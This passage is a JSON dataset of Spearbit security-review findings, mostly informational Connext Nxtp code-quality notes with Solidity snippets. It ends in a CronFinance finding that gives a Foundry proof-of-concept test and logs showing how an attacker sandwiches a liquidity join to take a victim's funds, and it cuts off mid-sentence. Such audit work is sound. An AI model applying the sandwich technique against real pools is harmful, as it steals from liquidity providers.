"ConnextNxtp", "Severity: Informational"]}, {"title": "Elaborate TypedMemView encoding in comments", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "TypedMemView describes its encoding in comments as: // next 12 are memory address // next 12 are len // bottom 3 bytes are empty The comments can be elaborated to make them less ambiguous.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Remove Curve StableSwap paper URL", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "www.curve.fi/stableswap-paper.pdf The current working URL is curve.fi/files/stableswap-paper.pdf. to Curve StableSwap paper referenced in comments Link is no longer active:", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Missing Validations in AmplificationUtils.sol", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "1. If initialAPrecise=futureAPrecise then there will not be any ramping. 2. In stopRampA function, self.futureATime > block.timestamp can be revised to self.futureATime >= block.timestamp since once current timestamp has reached futureATime, futureAprice will be returned al- ways.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Incorrect PriceSource is returned", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Price Source is returned incorrectly in case of stale prices as shown below 1. getTokenPrice function is called with _tokenAddress T1. 2. Assume the direct price is stale, so tokenPrice is set to 0. uint256 tokenPrice = assetPrices[tokenAddress].price; if (tokenPrice != 0 && ((block.timestamp - assetPrices[tokenAddress].updatedAt) <= VALID_PERIOD)) { return (tokenPrice, uint256(PriceSource.DIRECT)); } else { tokenPrice = 0; } 3. Now contract tries to retrieve price from oracle. In case the price is outdated, the returned price will again be 0 and source would be set to PriceSource.CHAINLINK. if (tokenPrice == 0) { tokenPrice = getPriceFromOracle(tokenAddress); source = PriceSource.CHAINLINK; } 128 4. Assuming v1PriceOracle is not yet set, contract will simply return the price and source which in this case is 0, PriceSource.CHAINLINK. In this case amount is correct but source is not correct. return (tokenPrice, uint256(source));", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "PriceSource.DEX is never used", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The enum value DEX is never used in the contract and can be removed.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Incorrect comment about handleOutgoingAsset", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The comment is incorrect as this function does not transfer funds to msg.sender. /** * @notice Handles transferring funds from the Connext contract to msg.sender. * @param _asset - The address of the ERC20 token to transfer. * @param _to - The recipient address that will receive the funds. * @param _amount - The amount to withdraw from contract. */ function handleOutgoingAsset( address _asset, address _to, uint256 _amount ) internal {", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "SafeMath is not required for Solidity 0.8.x", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Solidity 0.8.x has a built-in mechanism for dealing with overflows and underflows, so there is no need to use the SafeMath library", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Use a deadline check modifier in ProposedOwnable", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Any change in ownership through acceptProposedOwner() and renounceOwnership() has to go through a deadline check: // Ensure delay has elapsed if ((block.timestamp - _proposedOwnershipTimestamp) <= _delay) revert ProposedOwnable__acceptProposedOwner_delayNotElapsed(); This check can be extracted out in a modifier for readability.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Use ExcessivelySafeCall in SpokeConnector", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The low-level call code highlighted code above looks to be copied from ExcessivelySafeCall.sol. replacing this low-level call with the function call ExcessivelySafe- Consider", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "s.LIQUIDITY_FEE_NUMERATOR might change while a cross-chain transfer is in-flight", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "s.LIQUIDITY_FEE_NUMERATOR might change while a cross-chain transfer is in-flight.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "The constant expression for EMPTY_HASH can be simplified", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "EMPTY_HASH is a constant with a value equal to: hex\"c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470\", which is the keccak256 of an empty bytes. We can replace this constant hex literal with a more readable alternative.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Simplify and add more documentation for getTokenPrice", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "getTokenPrice can be simplified and it can try to return early whenever possible.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Remove unused code, files, interfaces, libraries, contracts, ...", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The codebase includes code, files, interfaces, libraries, and contracts that are no longer in use.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "_calculateSwapInv and _calculateSwap can mirror each other's calculations", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "_calculateSwapInv could have mirrored the implementation of _calculateSwap uint256 y = xp[tokenIndexTo] - (dy * multipliers[tokenIndexTo]); uint256 x = getY(_getAPrecise(self), tokenIndexTo, tokenIndexFrom, y, xp); Or the other way around _calculateSwap mirror _calculateSwapInv and pick whatever is cheaper.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Document that the virtual price of a stable swap pool might not be constant", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The virtual price of the LP token is not constant when the amplification coefficient is ramping even when/if token balances stay the same.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Document the reason for picking d is the starting point for calculating getYD using the Newton's method.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "d the stable swap invariant passed to getYD as a parameter and it is used as the starting point of the Newton method to find a root. This root is the value/price for the tokenIndex token that would stabilize the pool so that it would statisfy the stable swap invariant equation.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Document the max allowed tokens in stable swap pools used", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Based on the uint8 type for the indexes of tokens in different stable swap pools, it is inferred that the max possible number of tokens that can exist in a pool is 256. There is the following check when initializing internal pools: if (_pooledTokens.length <= 1 || _pooledTokens.length > 32) revert SwapAdminFacet__initializeSwap_invalidPooledTokens(); This means the internal pools can only have number of pooled tokens in 2, (cid:1) (cid:1) (cid:1) , 32.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Rename adoptedToLocalPools to better indicate what it represents", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "adoptedToLocalPools is used to keep track of external pools where one can swap between different variations of a token. But one might confuse this mapping as holding internal stable swap pools.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Document the usage of commented mysterious numbers in AppStorage", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Before each struct AppStorage's field definition there is a line comment consisting of only digits // xx One would guess they might be relative slot indexes in the storage (relative to AppStorage's slot). But the numbers are not consistent.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "RouterPermissionsManagerInfo can be packed differently for readability", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "RouterPermissionsManagerInfo has multiple fields that are each a mapping of address to a differ- ent value. The address here represents a liquidity router address. It would be more readable to pack these values such that only one mapping is used. This would also indicate how all these mapping have the same shared key which is the router.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Consolidate TokenId struct into a file that can be imported in relevant files", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "TokenId struct is defined both in BridgeMessage and LibConnextStorage with the same struc- ture/fields. If in future, one would need to update one struct the other one should also be updated in parallel.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Typos, grammatical and styling errors", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "There are a few typos and grammatical mistakes that can be corrected in the codebase.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Keep consistent return parameters in calculateSwapToLocalAssetIfNeeded", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "All return paths in calculateSwapToLocalAssetIfNeeded except one return _local as the 2nd return parameter. It would be best for readability and consistency change the following code to follow the same pattern if (_asset == _local) { return (_amount, _asset); }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Fix/add or complete missing NatSpec comments.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Some NatSpec comments are either missing or are incomplete.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Define and use constants for different literals used in the codebase.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Throughout the project, a few literals have been used. It would be best to define a named constant for those. That way it would be more clear the purpose of those values used and also the common literals can be consolidated into one place.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Enforce using adopted for the returned parameter in swapFromLocalAssetIfNeeded... for consis- tency.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The other return paths in swapFromLocalAssetIfNeeded, swapFromLocalAssetIfNeededForEx- actOut and calculateSwapFromLocalAssetIfNeeded use the adopted parameter as one of the return value com- ponents. It would be best to have all the return paths do the same thing. Note swapFromLocalAssetIfNeeded and calculateSwapFromLocalAssetIfNeeded should always return (_, adopted) and swapFromLocalAssetIfNeededForExactOut should always return (_, _, adopted).", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Use interface types for parameters instead of casting to the interface type multiple times", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Sometimes casting to the interface type has been performed multiple times. It will be cleaner if the parameter is defined as having that interface and avoid unnecessary casts.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Be aware of tokens with multiple addresses", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "If a token has multiple addresses (see weird erc20) then the token cap might have an unexpected effect, especially if the two addresses have a different cap. function _addLiquidityForRouter(...) ... { ... if (s.domain == canonical.domain) { // Sanity check: caps not reached uint256 custodied = IERC20(_local).balanceOf(address(this)) + _amount; uint256 cap = s.caps[key]; if (cap > 0 && custodied > cap) { revert RoutersFacet__addLiquidityForRouter_capReached(); } } ... }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Remove old references to claims", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The contract RelayerFacet still has some references to claims. These are a residue from a previous version and are not used currently. error RelayerFacet__initiateClaim_emptyClaim(); error RelayerFacet__initiateClaim_notRelayer(bytes32 transferId); event InitiatedClaim(uint32 indexed domain, address indexed recipient, address caller, bytes32[] transferIds); ,! event Claimed(address indexed recipient, uint256 total, bytes32[] transferIds);", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Doublecheck references to Nomad", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The code refers to nomad several times in a way that is currently not accurate. This could be confusing to the maintainers and readers of the code. This includes the following examples: BridgeFacet.sol:419: * @notice Initiates a cross-chain transfer of funds, calldata, and/or various named properties using the nomad ,! BridgeFacet.sol:423: * assets will be swapped for their local nomad asset counterparts (i.e. bridgeable tokens) via the configured AMM if swap is needed. The local tokens will * necessary. In the event that the adopted assets *are* local nomad assets, no ,! BridgeFacet.sol:424: ,! InboxFacet.sol:87: RoutersFacet.sol:533: AssetLogic.sol:102: asset. ,! AssetLogic.sol:139: swap ,! AssetLogic.sol:185: swap ,! AssetLogic.sol:336: adopted asset ,! AssetLogic.sol:375: * @notice Only accept messages from an Nomad Replica contract. * @param _local - The address of the nomad representation of the asset * @notice Swaps an adopted asset to the local (representation or canonical) nomad * @notice Swaps a local nomad asset for the adopted asset using the stored stable * @notice Swaps a local nomad asset for the adopted asset using the stored stable * @notice Calculate amount of tokens you receive on a local nomad asset for the * @notice Calculate amount of tokens you receive of a local nomad asset for the adopted asset ,! LibConnextStorage.sol:54: * @param receiveLocal - If true, will use the local nomad asset on the destination instead of adopted. ,! LibConnextStorage.sol:148: madUSDC on polygon). ,! LibConnextStorage.sol:204: LibConnextStorage.sol:268: madUSDC on polygon) * @dev Swaps for an adopted asset <> nomad local asset (i.e. POS USDC <> * this domain (the nomad local asset). * @dev Swaps for an adopted asset <> nomad local asset (i.e. POS USDC <> ,! ConnectorManager.sol:11: * @dev Each nomad router contract has a `XappConnectionClient`, which ,! references a 142", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Document usage of Nomad domain schema", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The library LibConnextStorage specifies that the domains are compatible with the nomad domain schema. However other locations don't mention this. This is especially important during the enrollment of new domains. * @param originDomain - The originating domain (i.e. where `xcall` is called). Must match nomad domain schema ,! * @param destinationDomain - The final domain (i.e. where `execute` / `reconcile` are called). Must match nomad domain schema ,! struct TransferInfo { uint32 originDomain; uint32 destinationDomain; ... }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Router has multiple meanings", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The term router is used for three different concepts. This is confusing for maintainers and readers of the code: A) The router that provides Liquidity and signs bids * `router` - this is the address that will sign bids sent to the sequencer B) The router that can add new routers of type A (B is a role and the address could be a multisig) /// @notice Enum representing address role enum Role { None, Router, Watcher, Admin } C) The router that what previously was BridgeRouter or xApp Router: * @param _router The address of the potential remote xApp Router", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Robustness of receiving contract", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "In the _reconciled branch of the code, the functions _handleExecuteTransaction(), _execute- Calldata() and excessivelySafeCall() don't revert when the underlying call reverts This seems to be inten- tional. This underlying revert can happen if there is a bug in the underlying call or if insufficient gas is supplied by the relayer. Note: if a delegate address is specified it can retry the call to try and fix temporary issues. The receiving contract already has received the tokens via handleOutgoingAsset() so must be prepared to handle these tokens. This should be explicitly documented. function _handleExecuteTransaction(...) ... { AssetLogic.handleOutgoingAsset(_asset, _args.params.to, _amountOut); _executeCalldata(_transferId, _amountOut, _asset, _reconciled, _args.params); ... } function _executeCalldata(...) ... { if (_reconciled) { ... (success, returnData) = ExcessivelySafeCall.excessivelySafeCall(...); } else { ... } }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Functions can be combined", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Both xcall and xcallIntoLocal have same code except receiveLocal (which is set false for xcall and true for xcallIntoLocal) value. Instead of having these as separate function, a single function can be created which can tweak the functionalities of xcall and xcallIntoLocal on basis of receiveLocal value", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Document source of zeroHashes", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The hashes which are used in function zeroHashes() are not explained, which makes it more difficult to understand and verify the code. function zeroHashes() internal pure returns (bytes32[TREE_DEPTH] memory _zeroes) { ... // keccak256 zero hashes bytes32 internal constant Z_0 = hex\"0000000000000000000000000000000000000000000000000000000000000000\"; ... bytes32 internal constant Z_31 = hex\"8448818bb4ae4562849e949e17ac16e0be16688e156b5cf15e098c627c0056a9\"; ,! ,! }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Document underflow/overflows in TypedMemView", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The function index() has an overflow when _bytes derflow when _len == 0. These two compensate each other so the end result of index() is as expected. As the special case for _bytes == 0 is also handled, we assume this is intentional. However this behavior isn't mentioned in the comments, while other underflow/overflows are documented. library TypedMemView { function index( bytes29 memView, uint256 _index, uint8 _bytes ) internal pure returns (bytes32 result) { ... unchecked { uint8 bitLength = _bytes * 8; } ... } function leftMask(uint8 _len) private pure returns (uint256 mask) { ... mask := sar( sub(_len, 1), ... ... ) } }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Use while loops in dequeueVerified()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Within function dequeueVerified() there are a few for loops that mention a variable as there first element. This is a null statement and can be removed. After removing, only a while condition remains. Replacing the for with a while would make the code more readable. Also (x >= y) can be replaced by (!(x < y)) or (!(y > x)) to save some gas. function dequeueVerified(Queue storage queue, uint256 delay) internal returns (bytes32[] memory) { ... for (last; last >= first; ) { ... } ... for (first; first <= last; ) { ... } }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Duplicate functions in Encoding.sol", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Encoding.sol defines a few functions already present in TypedMemView.sol: nibbleHex(), byte- Hex(), encodeHex().", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Document about two MerkleTreeManager's", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "On the hub domain (e.g. mainnet) there are two MerkleTreeManagers, one for the hub and one for the MainnetSpokeConnector. This might not be obvious to the casual readers of the code. Accidentally confusing the two would lead to weird issues.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Match filename to contract name", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Sometimes the name of the .sol file is different than the contract name. Also sometimes multiple contracts are defined in the same file. Additionally there are multiple .sol files with the same name. This makes it more difficult to find the file containing the contract. File: messaging/Merkle.sol contract MerkleTreeManager is ProposedOwnableUpgradeable { ... } File: messaging/libraries/Merkle.sol library MerkleLib { ... } File: ProposedOwnable.sol abstract contract ProposedOwnable is IProposedOwnable { ... } abstract contract ProposedOwnableUpgradeable is Initializable, ProposedOwnable { ... } File: OZERC20.sol 148 contract ERC20 is IERC20, IERC20Permit, EIP712 { ... }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Use uint40 for type in TypedMemView", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "All internal functions in TypedMemView use uint40 for type except build(). Since internal functions can be called by inheriting contracts, it's better to provide a consistent interface.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Comment in function typeOf() is inaccurate", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "A comment in function typeOf() is inaccurate. It says it is shifting 24 bytes, however it is shifting 216 / 8 = 27 bytes. function typeOf(bytes29 memView) internal pure returns (uint40 _type) { assembly { ... // 216 == 256 - 40 _type := shr(216, memView) // shift out lower 24 bytes } }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Missing Natspec documentation in TypedMemView", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "unsafeJoin()'s Natspec documentation is incomplete as the second argument to function is not documented.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Remove irrelevant comments", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": " Instance 1 - TypedMemView.sol#L770 clone() has this comment that seems to be copied from equal(). This is not applicable to clone() and can be deleted. * @dev Shortcuts if the pointers are identical, otherwise compares type and digest.  Instance 2 - SpokeConnector.sol#L499 The function process of SpokeConnector contains comments that are no longer relevant. // check re-entrancy guard // require(entered == 1, \"!reentrant\"); // entered = 0; Instance 3 - BridgeFacet.sol#L419 Nomad is no longer used within Connext. However, they are still being mentioned in the comments within the codebase. * @notice Initiates a cross-chain transfer of funds, calldata, and/or various named properties using ,! the nomad * network.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Incorrect comment about TypedMemView encoding", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "A TypedMemView variable of type bytes29 is encoded as follows:  First 5 bytes encode a type flag.  Next 12 bytes point to a memory address.  Next 12 bytes encode the length of the memory view (in bytes).  Next 3 bytes are empty. When shifting a TypedMemView variable to the right by 15 bytes (120 bits), the encoded length and the empty bytes are removed. Hence, this comment is incorrect: // 120 bits = 12 bytes (the encoded loc) + 3 bytes (empty low space) _loc := and(shr(120, memView), _mask)", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Constants can be used in assembly blocks directly", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Yul cannot read global variables, but that is not true for a constant variable as its value is embedded in the bytecode. Highlighted code above have the following pattern: uint256 _mask = LOW_12_MASK; // assembly can't use globals assembly { // solium-disable-previous-line no-inline-assembly _len := and(shr(24, memView), _mask) } Here, LOW_12_MASK is a constant which can be used directly in assembly code.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Document source of processMessageFromRoot()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The function processMessageFromRoot() of ArbitrumHubConnector doesn't contain a comment where it is derived from. Most other functions have a link to the source. Linking to the source would make the function easier to verify and maintain.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Be aware of zombies", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The function _validateSendRoot() of ArbitrumHubConnector check that stakerCount and child- StakerCount are larger than 0. The definition of stakerCount and childStakerCount document that they could include zombies. Its not immediately clear what zombies are, but it might be relevant to consider them. contract ArbitrumHubConnector is HubConnector { function _validateSendRoot(...) ... { ... require(node.stakerCount > 0 && node.childStakerCount > 0, \"!staked\"); } } // Number of stakers staked on this node. This includes real stakers and zombies uint64 stakerCount; // Number of stakers staked on a child node. This includes real stakers and zombies uint64 childStakerCount;", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Readability of proveAndProcess()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The function proveAndProcess() is relatively difficult to understand because it first processes for the case of i==0 and then does a loop over i==1..._proofs.length. function proveAndProcess(...) ... { ... bytes32 _messageHash = keccak256(_proofs[0].message); bytes32 _messageRoot = calculateMessageRoot(_messageHash, _proofs[0].path, _proofs[0].index); proveMessageRoot(_messageRoot, _aggregateRoot, _aggregatePath, _aggregateIndex); messages[_messageHash] = MessageStatus.Proven; for (uint32 i = 1; i < _proofs.length; ) { _messageHash = keccak256(_proofs[i].message); bytes32 _calculatedRoot = calculateMessageRoot(_messageHash, _proofs[i].path, _proofs[i].index); require(_calculatedRoot == _messageRoot, \"!sharedRoot\"); messages[_messageHash] = MessageStatus.Proven; unchecked { ++i; } } ... }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Readability of checker()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The function checker() is relatively difficult to read due to the else if chaining of if statements. As the if statements call return(), the else isn't necessary and the code can be made more readable. function checker() external view override returns (bool canExec, bytes memory execPayload) { bytes32 outboundRoot = CONNECTOR.outboundRoot(); if ((lastExecuted + EXECUTION_INTERVAL) > block.timestamp) { return (false, bytes(\"EXECUTION_INTERVAL seconds are not passed yet\")); } else if (lastRootSent == outboundRoot) { return (false, bytes(\"Sent root is the same as the current root\")); } else { execPayload = abi.encodeWithSelector(this.sendMessage.selector, outboundRoot); return (true, execPayload); } }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Use function addressToBytes32", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The function dispatch() of SpokeConnector contains an explicit conversion from address to bytes32. There is also a function addressToBytes32() that does the same and is more readable. function dispatch(...) ... { bytes memory _message = Message.formatMessage( ... bytes32(uint256(uint160(msg.sender))), ... );", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Balancer Read-Only Reentrancy Vulnerability (Changes from dev team added to audit.)", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf", "body": "Balancer's read-only reentrancy vulnerability potentially effects the following Cron-Fi TWAMM func- tions:  getVirtualReserves  getVirtualPriceOracle  executeVirtualOrdersToBlock A mitigation was provided by the Balancer team that uses a minimum amount of gas to trigger a reentrancy check. The Balancer vulnerability is discussed in greater detail here:  reentrancy-vulnerability-scope-expanded/4345", "labels": ["Spearbit", "CronFinance", "Severity: High Risk"]}, {"title": "Overpayment of one side of LP Pair onJoinPool due to sandwich or user error", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf", "body": "Only one of the two incoming tokens are used to determine the amount of pool tokens minted (amountLP) on join amountLP = Math.min( _token0InU112.mul(supplyLP).divDown(_token0ReserveU112), _token1InU112.mul(supplyLP).divDown(_token1ReserveU112) ); In the event the price moves between the time a minter sends their transaction and when it is included in a block, they may overpay for one of _token0InU112 or _token1InU112. This can occur due to user error, or due to being sandwiched. Concrete example: pragma solidity ^0.7.0; pragma experimental ABIEncoderV2; import \"forge-std/Test.sol\"; import \"../HelperContract.sol\"; import { C } from \"../../Constants.sol\"; import { ExecVirtualOrdersMem } from \"../../Structs.sol\"; contract JoinSandwich is HelperContract { uint256 WAD = 10**18; function testManualJoinSandwich() public { 5 address userA = address(this); address userB = vm.addr(1323); // Add some base liquidity from the future attacker. addLiquidity(pool, userA, userA, 10**7 * WAD, 10**7 * WAD, 0); assertEq(CronV1Pool(pool).balanceOf(userA), 10**7 * WAD - C.MINIMUM_LIQUIDITY); // Give userB some tokens to LP with. token0.transfer(userB, 1_000_000 * WAD); token1.transfer(userB, 1_000_000 * WAD); addLiquidity(pool, userB, userB, 10**6 * WAD, 10**6 * WAD, 0); assertEq(CronV1Pool(pool).balanceOf(userB), 10**6 * WAD); exit(10**6 * WAD, ICronV1Pool.ExitType(0), pool, userB); assertEq(CronV1Pool(pool).balanceOf(userB), 0); // Full amounts are returned b/c the exit penalty has been removed (as is being done anyway). assertEq(token0.balanceOf(userB), 1_000_000 * WAD); assertEq(token1.balanceOf(userB), 1_000_000 * WAD); // Now we'll do the same thing, simulating a sandwich from userA. uint256 swapProceeds = swapPoolAddr(5 * 10**6 * WAD, /* unused */ 0, ICronV1Pool.SwapType(0), address(token0), pool, ,! userA); // Original tx from userB is sandwiched now... addLiquidity(pool, userB, userB, 10**6 * WAD, 10**6 * WAD, 0); // Sell back what was gained from the first swap. swapProceeds = swapPoolAddr(swapProceeds, /* unused */ 0, ICronV1Pool.SwapType(0), address(token1), pool, userA); emit log_named_uint(\"swapProceeds 1 to 0\", swapProceeds); // allows seeing what userA lost to fees // Let's see what poor userB gets back of their million token0 and million token1... assertEq(token0.balanceOf(userB), 0); assertEq(token1.balanceOf(userB), 0); exit(ICronV1Pool(pool).balanceOf(userB), ICronV1Pool.ExitType(0), pool, userB); emit log_named_uint(\"userB token0 after\", token0.balanceOf(userB)); emit log_named_uint(\"userB token1 after\", token1.balanceOf(userB)); } } Output: Logs: swapProceeds 1 to 0: 4845178856516554015932796 userB token0 after: 697176321467715374004199 userB token1 after: 687499999999999999999999 1. We have a pool where the attacker is all of the liquidity (107 of each token) 2. A LP tries to deposit another 106 in equal proportions 3. The attacker uses a swap of 5 (cid:3) 106 of one of the tokens to 